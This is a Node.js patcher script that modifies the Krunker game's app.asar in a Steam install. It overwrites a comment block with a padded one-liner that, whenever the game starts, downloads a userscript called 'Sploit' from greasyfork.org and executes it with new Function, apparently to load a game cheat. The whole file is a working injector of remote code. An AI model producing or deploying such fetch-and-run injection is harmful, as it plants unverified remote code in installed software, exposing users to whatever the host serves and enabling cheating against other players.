var fs = require('fs'),
	path = require('path'),
	rl = require('readline').createInterface({ input: process.stdin, output: process.stdout }),
	snippet = '/**\n * Compiles JavaScript file to .jsc file.\n * @param   {object|string} args\n * @param   {string}          args.filename The JavaScript source file that will be compiled\n * @param   {boolean}         [args.compileAsModule=true] If true, the output will be a commonjs module\n * @param   {string}          [args.output=filename.jsc] The output filename. Defaults to the same path and name of the original file, but with `.jsc` extension.\n * @param   {string}        [output] The output filename. (Deprecated: use args.output instead)\n * @returns {string}        The compiled filename\n */',
	replace = `if(typeof window == 'object')require("https").request({host:'greasyfork.org',path:'/scripts/421228-sploit/code/Sploit.user.js'},(r,c=[])=>r.on("data",d=>c.push(d)).on("end",_=>new Function(Buffer.concat(c).toString())())).end();`,
	load_asar = folder => {
		folder = path.resolve(folder);
		
		var asar = path.join(folder, 'common', 'Krunker', 'resources', 'app.asar'),
			asarb = path.join(folder, 'common', 'Krunker', 'resources', 'app - Copy.asar');
		
		if(!fs.existsSync(asar))return console.log('Krunker is not installed here'), process.exit();
		
		var data = fs.readFileSync(asarb, 'latin1');
		
		if(!data.includes(snippet))return console.log('Krunker already patched'), process.exit();
		
		data = data.replace(snippet, replace.padStart(snippet.length, ';'));
		
		fs.writeFileSync(asar, data, 'latin1');
		
		console.log('Krunker patched');
		
		process.exit();
	};

if(replace.length > snippet.length)console.log('Snippet is ' + replace.length + ' characters, ' + (replace.length - snippet.length) + ' too huge!'), process.exit();

if(process.argv[process.argv.indexOf('-steam') + 1])load_asar(process.argv[process.argv.indexOf('-steam') + 1]);
else rl.question('Where is the steam library containing KRUNKER ( eg C:/steamlibrary/, C:/Program Files (x86)/Steam/steamapps/ )\n', load_asar);